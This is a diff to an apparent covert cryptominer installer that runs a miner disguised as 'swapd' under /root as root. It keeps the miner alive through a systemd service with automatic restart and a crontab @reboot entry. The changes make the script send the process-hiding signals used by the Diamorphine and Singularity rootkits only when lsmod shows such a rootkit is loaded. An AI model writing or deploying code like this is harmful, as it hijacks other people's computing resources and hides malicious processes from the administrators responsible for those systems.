@@ -1694,7 +1694,7 @@ Type=simple
 User=root
 WorkingDirectory=/root/.swapd
 ExecStart=$EXEC_START
-ExecStartPost=/bin/bash -c 'sleep 3; for i in 1 2 3; do pgrep -f swapd | xargs -r kill -31 2>/dev/null; pgrep -f swapd | xargs -r kill -59 2>/dev/null; sleep 1; done'
+ExecStartPost=/bin/bash -c 'sleep 3; if lsmod | grep -qE "diamorphine|singularity|rootkit"; then for i in 1 2 3; do pgrep -f swapd | xargs -r kill -31 2>/dev/null; pgrep -f swapd | xargs -r kill -59 2>/dev/null; sleep 1; done; fi'
 Restart=always
 RestartSec=10
 Nice=19
@@ -1780,15 +1780,17 @@ case "$1" in
         # BusyBox start-stop-daemon doesn't support --chdir
         start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || true
         
-        # Auto-hide process after start
-        sleep 3
-        for i in 1 2 3; do
-            for pid in $(get_pids swapd); do
-                kill -31 "$pid" 2>/dev/null || true
-                kill -59 "$pid" 2>/dev/null || true
+        # Auto-hide process after start (only if rootkits are loaded)
+        if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
+            sleep 3
+            for i in 1 2 3; do
+                for pid in $(get_pids swapd); do
+                    kill -31 "$pid" 2>/dev/null || true
+                    kill -59 "$pid" 2>/dev/null || true
+                done
+                sleep 1
             done
-            sleep 1
-        done
+        fi
         ;;
     stop)
         echo "Stopping $NAME..."
@@ -2373,9 +2375,14 @@ else
     if kill -0 $MINER_PID 2>/dev/null; then
         echo "[✓] Miner started as daemon (PID: $MINER_PID)"
         
-        # Send hide signals immediately
-        kill -31 $MINER_PID 2>/dev/null || true
-        kill -59 $MINER_PID 2>/dev/null || true
+        # Send hide signals immediately (only if rootkits loaded)
+        if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
+            kill -31 $MINER_PID 2>/dev/null || true
+            kill -59 $MINER_PID 2>/dev/null || true
+            echo "[✓] Hide signals sent"
+        else
+            echo "[*] Rootkits not loaded - process will remain visible"
+        fi
         
         # Add to crontab for auto-restart on reboot
         (crontab -l 2>/dev/null | grep -v "swapd"; echo "@reboot cd /root/.swapd && nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &") | crontab -
